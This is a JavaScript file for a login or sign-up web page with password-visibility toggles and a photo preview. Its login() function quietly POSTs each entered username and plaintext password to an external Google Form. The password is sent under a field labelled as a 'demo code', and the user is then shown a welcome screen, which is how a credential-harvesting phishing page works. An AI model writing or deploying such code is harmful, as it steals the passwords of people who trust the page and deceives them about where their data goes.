// ===== CONFIG =====
// Your Google Form POST URL (without viewform)
const FORM_URL =
  "https://docs.google.com/forms/d/e/1FAIpQLSewVJbVfyeTsgLx5WBdFvVc4vg16zS0JhkiTRlTH88iUFmhbw/formResponse";

// Real entry IDs from your pre-filled URL
const ENTRY_USERNAME = "entry.842584535";
const ENTRY_DEMO_CODE = "entry.588923101";

// If you have a 3rd field (Condition) and have its entry ID,
// replace the empty string below with that ID.
// If not, we’ll just send it as blank.
const ENTRY_CONDITION = "";

let currentUser = "";

// LOGIN HANDLER
function login() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const confirmPassword = document
    .getElementById("confirmPassword")
    .value.trim();

  const conditionText =
    document.querySelector(".condition")?.innerText || "";

  if (!username) {
    alert("Please enter username !!");
    return;
  }

  if (!password) {
    alert("Please enter password !!");
    return;
  }

  if (!confirmPassword) {
    alert("Please confirm your password !!");
    return;
  }

  if (password !== confirmPassword) {
    alert("Passwords do not match !!");
    return;
  }

  // 🚨 FETCH ONLY HAPPENS AFTER ALL CHECKS
  fetch(FORM_URL, {
    method: "POST",
    mode: "no-cors",
    body: new URLSearchParams({
      [ENTRY_USERNAME]: username,
      [ENTRY_DEMO_CODE]: password,
      [ENTRY_CONDITION]: conditionText
    })
  });

  currentUser = username;
  document.getElementById("modal").classList.add("show");
}

function enterApp() {
  document.getElementById("modal").classList.remove("show");
  document.getElementById("login").classList.add("hidden");
  document.getElementById("app").classList.remove("hidden");
  document.getElementById("user").innerText = currentUser;
}

// PHOTO PREVIEW
document.getElementById("photo").addEventListener("change", function (e) {
  const file = e.target.files[0];
  if (!file) return;

  const preview = document.getElementById("preview");
  preview.src = URL.createObjectURL(file);
  preview.onload = () => URL.revokeObjectURL(preview.src);
});

const passwordInput = document.getElementById("password");
const confirmPasswordInput = document.getElementById("confirmPassword");

const eyeIcon = document.getElementById("eyeIcon");
const confirmEyeIcon = document.getElementById("confirmEyeIcon");

/* Toggle main password */
function togglePassword() {
  if (passwordInput.type === "password") {
    passwordInput.type = "text";
    eyeIcon.src = "./images/eye-close-up.webp";
  } else {
    passwordInput.type = "password";
    eyeIcon.src = "./images/closed-eyes.webp";
  }
}

/* Toggle confirm password */
function toggleConfirmPassword() {
  if (confirmPasswordInput.type === "password") {
    confirmPasswordInput.type = "text";
    confirmEyeIcon.src = "./images/eye-close-up.webp";
  } else {
    confirmPasswordInput.type = "password";
    confirmEyeIcon.src = "./images/closed-eyes.webp";
  }
}

/* Match check */
function checkPasswordMatch() {
  if (!confirmPasswordInput.value) return;

  if (passwordInput.value === confirmPasswordInput.value) {
    confirmPasswordInput.style.borderColor = "#22c55e"; // green
  } else {
    confirmPasswordInput.style.borderColor = "#ef4444"; // red
  }
}

/* Live checking */
passwordInput.addEventListener("input", checkPasswordMatch);
confirmPasswordInput.addEventListener("input", checkPasswordMatch);
